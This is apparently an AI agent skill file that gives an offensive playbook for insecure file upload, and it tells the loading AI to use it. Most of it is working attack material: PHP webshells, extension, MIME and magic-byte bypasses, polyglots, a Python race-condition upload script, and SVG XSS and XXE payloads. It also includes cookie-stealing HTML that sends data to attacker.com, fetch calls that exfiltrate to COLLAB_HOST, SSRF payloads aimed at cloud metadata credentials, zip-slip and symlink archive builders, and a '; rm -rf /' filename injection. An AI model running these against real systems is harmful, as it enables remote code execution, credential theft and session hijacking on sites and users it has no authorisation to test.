---
name: vuln-file-upload
description: Insecure file upload playbook — extension bypass (.php.jpg, null byte, case tricks), content-type bypass, magic bytes bypass, polyglot files, path traversal in filename, race condition upload, stored XSS via SVG/HTML, SSRF via SVG/XML, and webshell techniques.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Insecure File Upload — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: File upload vulnerabilities allow attackers to place malicious files on a server, leading to RCE (via webshell), XSS (via SVG), SSRF (via SVG/XML), or path traversal. Covers all major restriction bypass techniques. Base models miss polyglot files, the double extension trick, and the race condition upload technique.

## 0. RELATED ROUTING

- path-traversal-lfi — use path traversal in filename to place file in arbitrary location
- race-condition — race the file scan/rename to access file before it's renamed
- xss — stored XSS via uploaded SVG/HTML files
- ghost-bits-cast-attack — Java Tomcat filename* bypass for webshell upload

---

## 1. EXTENSION BYPASS TECHNIQUES

### 1.1 Double Extensions

```
shell.php.jpg       # Server may execute .php despite .jpg suffix
shell.php.png
shell.php5          # Alternative PHP extension
shell.phtml         # PHP HTML template, often executed
shell.pHp           # Case variation (case-insensitive on Windows)
shell.PHP           # Uppercase
shell.PhP
```

### 1.2 PHP Alternative Extensions

```
.php, .php2, .php3, .php4, .php5, .php6, .php7, .phtml, .phar
.phps (source display, not execution)
.shtml (SSI execution on Apache)
.phtm
```

### 1.3 Blacklist Bypass

If `.php` is blacklisted but `.php5` is not:
```
shell.php5
shell.phtml
shell.phar
```

If Apache `.htaccess` can be uploaded:
```
# Upload .htaccess with:
AddType application/x-httpd-php .jpg
# Now .jpg files execute as PHP
```

### 1.4 Null Byte Injection (PHP < 5.3)

```
shell.php%00.jpg   # Server reads .php extension (before null), saves with .jpg
```

### 1.5 Semicolons (IIS/ASP)

```
shell.asp;.jpg     # IIS may execute the .asp part
shell.ashx;.jpg
```

---

## 2. CONTENT-TYPE BYPASS

Change `Content-Type` header to allowed type while keeping dangerous extension:

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

---

## 3. MAGIC BYTES BYPASS

Add valid image header bytes to make PHP file look like an image to `exif_imagetype()`:

```bash
# GIF header:
echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif

# JPEG header:
printf '\xff\xd8\xff\xe0' > header.bin
echo '<?php system($_GET["cmd"]); ?>' >> header.bin
mv header.bin shell.jpg

# PNG header:
python3 -c "
import struct, zlib
# Minimal valid PNG with PHP payload embedded in comment
print('\x89PNG\r\n\x1a\n')
# Then append PHP
" > shell.php
```

### Using ExifTool to inject PHP into JPEG metadata

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' clean.jpg
mv clean.jpg shell.jpg
# If server uses getimagesize() check → passes (valid JPEG)
# If server executes uploaded file → PHP in EXIF comment may be executed in some configs
```

---

## 4. POLYGLOT FILES

A polyglot file is simultaneously valid in two formats — passes as image but executes as PHP:

### JPEG/PHP Polyglot

```bash
# Full polyglot: valid JPEG that PHP can execute
# Start with valid JPEG, embed PHP in comment/IDAT chunk
# Server: reads as valid image; PHP engine: executes PHP code
```

### PDF/PHP Polyglot

```bash
# A file that is simultaneously valid PDF and PHP
# PHP ignores everything before the opening tag
%PDF-1.4
1 0 obj...
<?php system($_GET['cmd']); ?>
%%EOF
```

---

## 5. PATH TRAVERSAL IN FILENAME

If the server uses the uploaded filename without sanitization:

```
filename="../../../var/www/html/shell.php"
filename="....//....//....//var/www/html/shell.php"
# Double URL encode: filename="%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

---

## 6. RACE CONDITION UPLOAD

Upload a PHP webshell that gets deleted after content scanning:

```python
import threading, requests

# Thread 1: Upload PHP webshell repeatedly
def upload_loop():
    while True:
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
        requests.post('https://target.com/upload', files=files)

# Thread 2: Try to access the uploaded file before it's deleted
def access_loop():
    while True:
        r = requests.get('https://target.com/uploads/shell.php?cmd=id')
        if 'uid=' in r.text:
            print(f"SUCCESS: {r.text}")
            break

t1 = threading.Thread(target=upload_loop)
t2 = threading.Thread(target=access_loop)
t1.start(); t2.start()
```

---

## 7. SVG UPLOAD — STORED XSS

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.cookie);
  </script>
</svg>
```

If the SVG is served with `Content-Type: image/svg+xml` and displayed in the browser, the script executes.

---

## 8. SVG UPLOAD — SSRF

```svg
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text y="20">&xxe;</text>
</svg>
```

Or HTTP SSRF:

```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## 9. HTML UPLOAD — STORED XSS

```html
<html><body>
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
</body></html>
```

If HTML files are served from the same origin → stored XSS with cookie theft.

---

## 10. WEBSHELL PAYLOADS

```php
# Minimal PHP webshell
<?php system($_GET['cmd']); ?>

# More robust:
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>

# POST-based:
<?php system($_POST['cmd']); ?>

# B374k (feature-rich webshell): https://github.com/b374k/b374k
# C99 / r57 shells (older but comprehensive)
```

---

## 11. BYPASSING SERVER-SIDE CONTENT CHECKS

| Check | Bypass |
|---|---|
| `getimagesize()` | Add valid image header bytes (magic bytes) |
| `exif_imagetype()` | GIF/JPEG/PNG magic bytes in first bytes |
| Content-Type header | Change to `image/jpeg` in request |
| Extension blacklist | Use alternative extensions (.php5, .phtml) |
| Extension whitelist | Null byte injection, double extension |
| AV scan | Race condition, encoded payload, polyglot |

---

## 12. TESTING CHECKLIST

```
□ Map all file upload endpoints (avatar, documents, imports, attachments)
□ Identify allowed extensions and MIME types
□ Test .php extension with valid Content-Type: image/jpeg
□ Test PHP alternative extensions: .php5, .phtml, .phar, .php7
□ Test null byte: filename="shell.php%00.jpg"
□ Test double extension: shell.php.jpg
□ Test case variation: shell.PHP, shell.pHp
□ Add image magic bytes to PHP file for getimagesize bypass
□ Upload SVG with XSS payload
□ Upload SVG with XXE payload (SSRF to internal services)
□ Test path traversal in filename
□ Test .htaccess upload if Apache server
□ Test race condition if file gets renamed/deleted after upload
```


---

## Hunt Methodology (Claude-BugHunter — real BB reports)

## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## ImageMagick / FFmpeg Exploitation

### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### FFmpeg SSRF via HLS Playlist
```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

## Headless Chrome / PDF Generator SSRF

### HTML → PDF Converter Attacks
```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

## Archive Extraction Attacks (Zip Slip / Symlink)

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## Related Skills & Chains

- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.


